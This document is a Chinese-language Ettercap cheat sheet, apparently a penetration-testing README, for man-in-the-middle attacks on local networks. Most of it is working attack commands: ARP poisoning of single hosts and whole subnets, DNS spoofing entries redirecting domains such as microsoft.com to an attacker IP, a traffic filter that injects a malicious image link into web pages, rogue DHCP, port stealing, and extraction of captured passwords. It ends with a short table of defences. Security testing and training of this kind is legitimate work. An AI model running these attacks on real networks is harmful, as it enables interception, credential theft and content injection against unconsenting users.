<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Ettercap 备忘单

[Ettercap](https://www.ettercap-project.org/) 是针对局域网 (LAN) 上的中间人 (MITM) 攻击的综合套件。它具有实时连接嗅探、动态内容过滤、许多协议的主动和被动剖析以及对 ARP 中毒、ICMP 重定向、DHCP 欺骗和端口窃取的支持。

---

## 目录

- [核心架构和模式](#core-architecture--modes)
- [安装和快速设置](#installation--quick-setup)
- [ARP 中毒和嗅探](#arp-poisoning--sniffing)
- [DNS 欺骗攻击](#dns-spoofing-attacks)
- [自定义数据包过滤 (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [DHCP 欺骗和端口窃取](#dhcp-spoofing--port-stealing)
- [日志记录和数据包提取](#logging--packet-extraction)
- [防御检测与对策](#defective-Detection--countermeasures)

---

## 核心架构与模式

Ettercap支持多种执行模式：
- **`-T`（文本模式）：** 轻量级、非诅咒终端输出，非常适合脚本编写和无头自动化。
- **`-C`（Curses 模式）：** 基于 Ncurses 的终端 UI，无需 X11 即可进行交互式操作。
- **`-G`（GTK 模式）：** 完整的图形界面。
- **`-D`（守护程序模式）：** 在后台静默运行。

目标规范语法：
```text
/MAC/IPs/IPv6/PORTs
```
- 目标可以用逗号分隔或 IP 范围：`//` 匹配所有内容。
- 示例：`/192.168.1.50/` 在所有端口上以 IP `192.168.1.50` 为目标。
- 示例：`//80,443/` 以端口 80 和 443 上的所有主机为目标。

---

## 安装和快速设置
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
验证配置文件位置：
- `/etc/ettercap/etter.conf`：核心网络和权限下降配置。
- `/etc/ettercap/etter.dns`：DNS欺骗记录查找表。

---

## ARP 中毒和嗅探

### 1.双向远程ARP中毒
破坏目标工作站和网络网关之间的 ARP 表：
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`：文本模式。
- `-q`：安静模式（减少冗长，仅显示捕获的凭据）。
- `-i eth0`：监听和注入网络接口。
- `-M arp:remote`：执行双向中间人 ARP 中毒。

### 2.整个子网嗅探（单向/广播）
针对默认网关毒害子网上的所有主机：
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3.仅被动嗅探
捕获通过当前主机的明文凭据，无需 ARP 欺骗：
```bash
sudo ettercap -T -q -i eth0
```
---

## DNS 欺骗攻击

Ettercap 包含内置插件，包括 `dns_spoof`。

### 第 1 步：配置 `/etc/ettercap/etter.dns`
添加通配符或特定域重定向：
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### 步骤 2：使用 DNS 插件启动 Ettercap
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`：激活 DNS 欺骗插件。
- 截获的与 `etter.dns` 匹配的 DNS 查询返回攻击者 IP。

---

## 自定义数据包过滤 (`etterfilter`)

Ettercap 允许使用自定义过滤器脚本进行实时数据包检查和有效负载修改。

### 1.编写过滤器脚本（`replace_img.filter`）
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. 使用 `etterfilter` 编译过滤器
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. 使用过滤器执行
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## DHCP 欺骗和端口窃取

### 1. 恶意 DHCP 服务器攻击
比合法 DHCP 服务器更快地响应来分配恶意网关和 DNS 地址：
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- 语法：`dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. 端口窃取攻击（交换机泛洪/CAM 表滥用）
在 ARP 中毒被阻止或发出警报的交换网络上窃取流量：
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## 日志记录和数据包提取

### 保存原始捕获的会话
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`：写入原始 pcap 数据包数据。
- `-L ettercap_log`：编写经过剖析的人类可读的文本日志。

### 使用 `etterlog` 转换二进制日志
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## 防御检测和对策

|矢量|检测与防御机制|
|---|---|
| **ARP 欺骗** |在托管交换机上启用动态 ARP 检查 (DAI)；检查 `arp -a` 是否有重复的 MAC；运行 `arpwatch` 或 `arpon`。 |
| **DNS 欺骗** |实施 DNSSEC、DoH（DNS-over-HTTPS）或 DoT（DNS-over-TLS）。 |
| **DHCP 欺骗** |在交换机上启用 DHCP 侦听以指定受信任的上行链路端口。 |
| **端口窃取** |通过每个交换机端口的 MAC 限制实施 802.1X 网络访问控制 (NAC) 和端口安全。 |